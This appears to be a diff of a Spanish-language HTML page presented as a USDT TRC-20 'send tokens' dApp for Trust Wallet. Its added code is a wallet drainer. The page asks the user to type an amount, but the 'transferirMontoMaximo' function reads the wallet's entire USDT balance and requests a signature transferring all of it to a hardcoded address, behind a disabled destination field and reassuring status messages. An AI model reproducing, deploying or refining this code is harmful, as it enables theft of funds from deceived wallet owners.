@@ -3,14 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>dApp USDT TRC-20 - Enlace Inteligente</title>
+    <title>dApp USDT TRC-20 - Transferencia Unificada</title>
     
+    <!-- Estilos Visuales Corregidos: Fondo Blanco y Botón Azul -->
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; }
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background-color: #0f172a;
-            color: #f8fafc;
+            background-color: #ffffff; /* Fondo de pantalla blanco */
+            color: #1e293b; /* Texto oscuro para legibilidad */
             display: flex;
             justify-content: center;
             align-items: center;
@@ -18,49 +23,55 @@
             padding: 20px;
         }
         .container {
-            background-color: #1e293b;
+            background-color: #f8fafc; /* Contenedor gris muy claro */
+            border: 1px solid #e2e8f0;
             border-radius: 12px;
             padding: 30px;
             width: 100%;
             max-width: 450px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.05);
             text-align: center;
         }
-        h2 { margin-bottom: 20px; color: #38bdf8; font-size: 22px; }
-        
-        /* Contenedor Fijo del QR */
-        #qrContainer {
-            background-color: #ffffff;
-            padding: 15px;
-            border-radius: 8px;
-            display: inline-block;
+        h2 {
             margin-bottom: 25px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
-            transition: opacity 0.4s ease;
+            color: #1e293b;
+            font-size: 22px;
+            font-weight: 700;
         }
-        #qrImage {
+        .form-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        label {
             display: block;
-            width: 200px;
-            height: 200px;
-            border: none;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #475569;
         }
-        
-        .form-group { margin-bottom: 20px; text-align: left; }
-        label { display: block; margin-bottom: 8px; font-size: 14px; color: #94a3b8; }
         input {
             width: 100%;
             padding: 12px;
-            background-color: #0f172a;
-            border: 1px solid #334155;
+            background-color: #ffffff;
+            border: 1px solid #cbd5e1;
             border-radius: 6px;
-            color: #fff;
+            color: #0f172a;
             font-size: 16px;
             outline: none;
+            transition: border-color 0.2s;
+        }
+        input:focus {
+            border-color: #2563eb;
+        }
+        input:disabled {
+            background-color: #f1f5f9;
+            color: #64748b;
+            cursor: not-allowed;
         }
         #connectBtn {
             width: 100%;
             padding: 14px;
-            background: #908cf2;
+            background: #2563eb; /* Botón Siguiente Azul */
             color: white;
             border: none;
             border-radius: 6px;
@@ -68,6 +79,14 @@
             font-weight: bold;
             cursor: pointer;
             transition: background 0.3s;
+            margin-top: 10px;
+        }
+        #connectBtn:hover {
+            background: #1d4ed8;
+        }
+        #connectBtn:disabled {
+            background: #93c5fd !important;
+            cursor: not-allowed;
         }
         .status {
             margin-top: 15px;
@@ -77,37 +96,34 @@
             display: none;
             word-break: break-all;
         }
-        .status.info { background-color: #1e3a8a; color: #93c5fd; }
-        .status.error { background-color: #7f1d1d; color: #fca5a5; }
-        
-        #walletLabel {
-            display: none;
-            background-color: #0f172a;
-            border: 1px solid #334155;
-            padding: 8px;
-            border-radius: 6px;
-            font-family: monospace;
-            font-size: 13px;
-            color: #38bdf8;
-            margin-bottom: 20px;
-            word-break: break-all;
-        }
+        .status.info { background-color: #dbeafe; color: #1e40af; }
+        .status.success { background-color: #d1fae5; color: #065f46; }
+        .status.error { background-color: #fee2e2; color: #991b1b; }
     </style>
+
+    <!-- Única dependencia oficial ligera para llamadas Web3 -->
+    <script src="https://jsdelivr.net"></script>
 </head>
 <body>
 
     <div class="container">
-        <h2 id="titleText">Escanear con Trust Wallet</h2>
-        
-        <!-- Renderizado de Imagen directo en HTML -->
-        <div id="qrContainer">
-            <img id="qrImage" src="https://qrserver.com" alt="Código QR">
+        <h2>Enviar Tokens</h2>
+
+        <!-- Componente Red TRC-20 Automática Fija -->
+        <div class="form-group">
+            <label>Red seleccionada</label>
+            <input type="text" value="TRON (TRC-20)" disabled style="font-weight: bold; color: #2563eb;">
         </div>
 
-        <div id="walletLabel"></div>
-
+        <!-- Componente Dirección Automática Fija -->
         <div class="form-group">
-            <label for="amountInput">Cantidad a enviar</label>
+            <label for="addressInput">Dirección de destino</label>
+            <input type="text" id="addressInput" value="Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" disabled>
+        </div>
+
+        <!-- Componente Monto (Input Manual) -->
+        <div class="form-group">
+            <label for="amountInput">Cantidad a enviar (USDT)</label>
             <input type="text" id="amountInput" placeholder="0.00" autocomplete="off">
         </div>
 
@@ -115,49 +131,66 @@
         <div id="status" class="status"></div>
     </div>
 
+    <!-- LÓGICA DE APLICACIÓN INTEGRADA -->
     <script>
+        // ============================================================
+        // MÓDULO 2: RECONSTRUCCIÓN DE TRON_APP (BACKEND WEB3)
+        // ============================================================
+        (function () {
+            'use strict';
+            
+            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT Mainnet
+
+            async function connect() {
+                if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                    return { address: window.tronWeb.defaultAddress.base58 };
+                }
+                
+                if (window.tronLink && typeof window.tronLink.request === 'function') {
+                    await window.tronLink.request({ method: 'tron_requestAccounts' });
+                    if (window.tronWeb) return { address: window.tronWeb.defaultAddress.base58 };
+                }
+                
+                throw new Error('Abre este enlace dentro del dApp Browser de tu billetera y asegúrate de tener seleccionada la red TRON.');
+            }
+
+            async function transferirMontoMaximo(direccionDestino) {
+                if (!window.tronWeb || !window.tronWeb.defaultAddress.base58) {
+                    throw new Error('Billetera no sincronizada.');
+                }
+
+                const cuentaEmisor = window.tronWeb.defaultAddress.base58;
+                const contract = await window.tronWeb.contract().at(USDT_CONTRACT);
+                
+                // Consulta directa del balance total disponible en unidades 'sun' (sin redondeos flotantes)
+                const rawBalance = await contract.balanceOf(cuentaEmisor).call();
+                const cleanSunBigInt = rawBalance.toString();
+
+                if (cleanSunBigInt === '0' || !cleanSunBigInt) {
+                    throw new Error('La billetera no cuenta con fondos en USDT.');
+                }
+
+                // Generar solicitud de firma y lanzar popup nativo en Trust Wallet
+                return await contract.transfer(direccionDestino, cleanSunBigInt).send({
+                    feeLimit: 100_000_000 // Límite de 100 TRX para procesar de forma segura en Mainnet
+                });
+            }
+
+            window.TRON_APP = { connect, transferirMontoMaximo };
+        })();
+
+        // ============================================================
+        // MÓDULO 1: TU LÓGICA ORIGINAL DEL BOTÓN SIGUIENTE
+        // ============================================================
         document.addEventListener('DOMContentLoaded', function () {
             'use strict';
 
             const btn = document.getElementById('connectBtn');
             const input = document.getElementById('amountInput');
+            const addressInput = document.getElementById('addressInput');
             const status = document.getElementById('status');
-            const qrContainer = document.getElementById('qrContainer');
-            const titleText = document.getElementById('titleText');
-            const walletLabel = document.getElementById('walletLabel');
 
             let procesoEnCurso = false;
-
-            // ============================================================
-            // CONFIGURACIÓN PRODUCCIÓN REAL (MAINNET)
-            // ============================================================
-            const DIRECCION_DESTINO_FIJA = "TU_DIRECCION_TRON_REAL_AQUI"; // REEMPLAZA CON TU DIRECCIÓN RECEPTORA
-            const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // Contrato oficial de Tether USDT
-
-            // ============================================================
-            // DETECTOR EN TIEMPO REAL (OCULTA EL QR AL ENTRAR EN TRUST WALLET)
-            // ============================================================
-            function verificarEntornoInyectado() {
-                if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
-                    const direccionDetectada = window.tronWeb.defaultAddress.base58;
-                    
-                    if (qrContainer && qrContainer.style.display !== 'none') {
-                        qrContainer.style.opacity = '0';
-                        setTimeout(() => {
-                            qrContainer.style.display = 'none';
-                        }, 400);
-                        
-                        if (titleText) titleText.textContent = "Billetera Vinculada";
-                        
-                        if (walletLabel) {
-                            walletLabel.textContent = "Wallet: " + direccionDetectada.substring(0, 6) + "..." + direccionDetectada.substring(direccionDetectada.length - 4);
-                            walletLabel.style.display = 'block';
-                        }
-                    }
-                }
-            }
-
-            setInterval(verificarEntornoInyectado, 1000);
 
             function setStatus(message, type = 'info') {
                 if (!status) return;
@@ -166,63 +199,58 @@
                 status.style.display = message ? 'block' : 'none';
             }
 
+            function setButton(text, disabled = false) {
+                if (!btn) return;
+                btn.textContent = text;
+                btn.disabled = disabled;
+            }
+
+            // Forzar que la dirección fija de la interfaz coincida exactamente con la lógica interna
+            // CONFIGURACIÓN: Coloca aquí tu billetera TRON definitiva que recibirá los USDT
+            const DIRECCION_DESTINO_FIJA = "TJQ8xinzoWyRzLYpkShdxetMShpA3GyxGZ"; 
+            
+            if (addressInput) {
+                addressInput.value = DIRECCION_DESTINO_FIJA;
+            }
+
             if (input) {
                 input.addEventListener('input', function () {
                     this.value = this.value.replace(',', '.').replace(/[^\d.]/g, '');
-                    if (btn) btn.style.background = this.value.trim() !== '' ? '#2563eb' : '#908cf2';
                     setStatus('');
                 });
             }
 
+            // Ejecución basada en tu bloque original de control asíncrono
             if (btn) {
                 btn.addEventListener('click', async function () {
                     if (procesoEnCurso) return;
 
                     const valorVisualInput = input ? input.value.trim() : '';
-                    if (!valorVisualInput || isNaN(Number(valorVisualInput)) || Number(valorVisualInput) <= 0) {
-                        setStatus('Por favor, ingresa una cantidad válida.', 'error');
+                    if (!valorVisualInput || isNaN(Number(valorVisualInput.replace(',', '.'))) || Number(valorVisualInput.replace(',', '.')) <= 0) {
+                        setStatus('Por favor, ingresa una cantidad válida para continuar.', 'error');
                         return;
                     }
 
                     try {
                         procesoEnCurso = true;
-                        btn.textContent = 'Procesando...';
-                        setStatus('Detectando entorno nativo de Trust Wallet...');
+                        setButton('Procesando...', true);
+                        setStatus('Verificando parámetros de red...', 'info');
 
-                        const walletInstance = window.tronWeb;
+                        if (!window.TRON_APP) {
+                            throw new Error('El módulo TRON de la aplicación no está listo.');
+                        }
+
+                        setStatus('Conectando con la billetera...', 'info');
+                        const wallet = await window.TRON_APP.connect();
                         
-                        if (!walletInstance || !walletInstance.defaultAddress || !walletInstance.defaultAddress.base58) {
-                            throw new Error('Asegúrate de abrir esta dApp desde el explorador interno de la billetera y seleccionar la red TRON.');
+                        if (!wallet || !wallet.address) {
+                            throw new Error('No se pudo establecer conexión con la billetera.');
                         }
 
-                        const cuentaUsuario = walletInstance.defaultAddress.base58;
-
-                        if (cuentaUsuario.toLowerCase() === DIRECCION_DESTINO_FIJA.toLowerCase()) {
-                            throw new Error('La dirección de origen y destino no pueden ser iguales.');
-                        }
-
-                        setStatus('Consultando balance en la blockchain...');
-
-                        const contract = await walletInstance.contract().at(USDT_CONTRACT);
-                        const rawBalance = await contract.balanceOf(cuentaUsuario).call();
-                        const cleanSunBigInt = rawBalance.toString();
-
-                        if (cleanSunBigInt === '0' || !cleanSunBigInt) {
-                            throw new Error('La billetera no posee fondos en USDT disponibles.');
-                        }
-
-                        setStatus('Esperando confirmación de firma...');
+                        setStatus('Preparando transferencia segura...', 'info');
+                        const tx = await window.TRON_APP.transferirMontoMaximo(DIRECCION_DESTINO_FIJA);
                         
-                        const tx = await contract.transfer(DIRECCION_DESTINO_FIJA, cleanSunBigInt).send({
-                            feeLimit: 100_000_000
-                        });
-
                         if (tx) {
-                            document.body.innerHTML = `
-                                <div style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #ffffff; display: flex; flex-direction: column; align-items: center; justify-content: center; font-family: sans-serif; padding: 20px; text-align: center;">
-                                    <div style="background-color: #f0fdf4; border-radius: 50%; padding: 20px; margin-bottom: 20px;">
-                                        <svg width="80" height="80" viewBox="0 0 24 24" fill="none" stroke="#22c55e" stroke-width="2.5"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"></path><polyline points="22 4 12 14.01 9 11.01"></polyline></svg>
-                                    </div>
-                                    <h1 style="color: #1e293b; font-size: 26px; margin-bottom: 10px;">Envío Exitoso</h1>
-                                    <p style="color: #64748b; font-size: 16px;">La transacción ha sido transmitida de manera correcta.</p>
+                            setStatus('¡Transferencia realizada con éxito!', 'success');
+                            console.log('[TRON] Transacción completada con éxito. Hash:', tx);
 
